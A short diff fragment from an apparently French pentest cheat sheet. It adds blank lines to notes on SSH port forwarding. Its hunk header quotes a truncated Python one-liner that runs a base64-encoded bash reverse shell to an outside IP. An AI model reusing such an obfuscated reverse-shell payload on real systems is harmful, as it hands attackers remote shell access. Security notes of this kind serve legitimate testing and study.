@@ -212,7 +212,9 @@ __import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNy4yNT
 # Port Forward :
 Port forwarding avec ssh
  - ssh -L 9999:127.0.0.1:8000 Username@TargetIP
+   
     Port local : 9999
+   
     Port a rediriger 8000
     
 
